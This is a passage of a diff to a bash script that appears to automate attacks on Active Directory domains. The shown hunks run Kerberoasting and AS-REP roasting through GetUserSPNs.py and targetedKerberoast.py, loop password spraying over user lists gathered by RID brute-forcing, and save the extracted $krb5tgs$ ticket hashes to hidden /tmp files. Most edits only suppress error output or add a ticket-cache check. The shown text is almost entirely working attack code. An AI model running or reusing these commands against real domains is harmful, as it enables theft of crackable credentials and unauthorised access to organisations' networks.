+ 	    if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
+                 echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
+                 getTGT.py $CLEAN_DOMAIN/$User:\$i -dc-ip $DC -k 2>/dev/null
+                 if [ -f "\$User.ccache" ]; then
+                      export KRB5CCNAME="\$User.ccache"
+                 fi
+                 echo ""  
+            fi   
             python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p \$i -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$i 2>/dev/null
             grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$i > /tmp/.tgs1.txt.\$i
             cat /tmp/.tgs1.txt.\$i
@@ -5102,8 +5223,10 @@ else
     echo ""  
     if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
             echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"      
-            getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k
-            export KRB5CCNAME=$User.ccache
+            getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 2>/dev/null
+            if [ -f $User.ccache ]; then
+                 export KRB5CCNAME=$User.ccache
+	    fi
             echo ""  
     fi   
     python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$User 2>/dev/null
@@ -5132,7 +5255,7 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"//tmp/.test1_nxc_rid_brute:\"$Password\" -request $dc_host $flag --[+]\033[0m"
             while read -r u; do
                 while read -r p; do
-                    GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag
+                    GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag 2>/dev/null
                 done < $Password
             done < /tmp/.test1_nxc_rid_brute
             echo ""
@@ -5140,7 +5263,7 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
             for i in \$(cat /tmp/.test1_nxc_rid_brute); do
                 echo ""
                 echo -e "\033[36m\$i\033[0m" 
-                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
+                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                 if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                     cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                     echo "\$i" > /tmp/.current_i.txt
@@ -5163,14 +5286,14 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
             fi
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"/tmp/.test1_nxc_rid_brute:\"$Password\" -request $dc_host $flag --[+]\033[0m"
             while read -r u; do
-                GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag
+                GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag 2>/dev/null
             done < /tmp/.test1_nxc_rid_brute
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
             for i in \$(cat /tmp/.test1_nxc_rid_brute); do
                 echo ""
                 echo -e "\033[36m\$i\033[0m"
-                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
+                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                 if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                     cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                     echo "\$i" > /tmp/.current_i.txt
@@ -5193,14 +5316,14 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
             fi
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
                 while read -r p; do
-                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag
+                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null
                 done < $Password
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
             for i in \$(cat /tmp/.test1_nxc_rid_brute); do 
                 echo ""
                 echo -e "\033[36m\$i\033[0m"
-                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC CLEAN_DOMAIN/ | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
+                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                 if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                     cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                     echo "\$i" > /tmp/.current_i.txt
@@ -5222,7 +5345,7 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                 getnpusers_check
             fi
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
-            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag
+            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
             for i in \$(cat /tmp/.test1_nxc_rid_brute); do
@@ -5245,7 +5368,7 @@ else
         echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
         while read -r u; do 
             while read -r p; do
-                GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag
+                GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag 2>/dev/null
             done < $Password
         done < $User
         echo ""
@@ -5263,7 +5386,7 @@ else
         for i in \$(cat $User); do
             echo ""
             echo -e "\033[36m\$i\033[0m"
-            GetUserSPNs.py -no-preauth "\$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
+            GetUserSPNs.py -no-preauth "\$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
             if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                 cp /tmp/.getuserspn.txt /tmp/.getuserspn1.txt.\$i
                 echo "\$i" > /tmp/.current_i.txt
@@ -5289,7 +5412,7 @@ else
         for i in \$(cat $User); do
             echo ""
             echo -e "\033[36m\$i\033[0m"
-            GetUserSPNs.py -no-preauth "\$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
+            GetUserSPNs.py -no-preauth "\$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
             if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                 cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                 echo "\$i" > /tmp/.current_i.txt
@@ -5303,12 +5426,12 @@ else
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
                 while read -r p; do
-                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag
+                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null
                 done < $Password
             echo ""
     else
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
-            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag
+            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
             echo ""
     fi
 fi
@@ -5366,5 +5489,4 @@ echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"
 #      done
 #--------------------------------------
 #    elif [[ "$tool" == "exit" ]]; then
-                                                                           
-                                                              
+                                                                          
